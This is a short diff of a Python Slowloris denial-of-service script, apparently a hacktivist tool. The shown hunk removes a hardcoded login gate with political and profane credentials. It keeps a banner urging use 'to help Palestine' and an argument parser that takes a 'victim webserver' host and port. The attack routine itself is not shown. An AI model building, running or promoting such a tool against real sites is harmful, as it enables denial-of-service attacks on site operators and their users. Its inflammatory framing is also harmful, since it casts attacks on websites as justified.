@@ -30,19 +30,7 @@ print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 21}\03
 print(f"\033[97m║\033[104m{' ' * 20}Just to fight to help Palestine{' ' * 20}\033[0m║")
 print(f"\033[97m║\033[104m{' ' * 28}_Use it wisely_{' ' * 28}\033[0m║")
 print(f"\033[97m╚{'═' * 71}╝")
-while attemps < 100:
-    print("\033[38;5;6m┏━━ Developer : KunFayz━━⬣")
-    print("\033[38;5;6m┏━━ Author : Zblack 313━━⬣")
-    username = input("\033[38;5;6m┗> Enter Username: \033[30m")
-    password = input("\033[38;5;6m┗> Enter password: \033[30m")
 
-    if username == 'fuck zion' and password == 'free palestine':
-        print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
-        break
-    else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
-        attemps += 1
-        continue
 parser = argparse.ArgumentParser(description="Slowloris PoC demonstration in python3")
 parser.add_argument('RHOST', nargs="?", help="Remote host, the victim webserver in either domain or IP format")
 parser.add_argument('-p', '--port', default=80, help="Port of the remote webserver", type=int)
